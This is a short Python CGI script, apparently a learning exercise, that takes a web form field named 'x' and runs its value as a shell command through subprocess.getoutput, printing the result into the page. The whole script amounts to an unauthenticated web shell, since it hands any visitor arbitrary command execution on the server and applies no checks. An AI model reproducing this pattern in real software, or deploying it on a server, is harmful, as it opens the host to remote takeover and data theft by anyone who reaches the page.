#!/usr/bin/python3
import cgi
import cgitb    # used to trace error in browser part
import subprocess
# to show common error in webbrowser
cgitb.enable()
print('Content-type:text/html')
print('')

webdata=cgi.FieldStorage()      # This will collect all the html code with data

# Now extracting value of x
data = webdata.getvalue('x')

# Sending output of client via web server
#import math
#print(dir(math))
#print(os.system(f'{data}'))
output = subprocess.getoutput(data)
print("<pre>")
print(output)
print("</pre>")

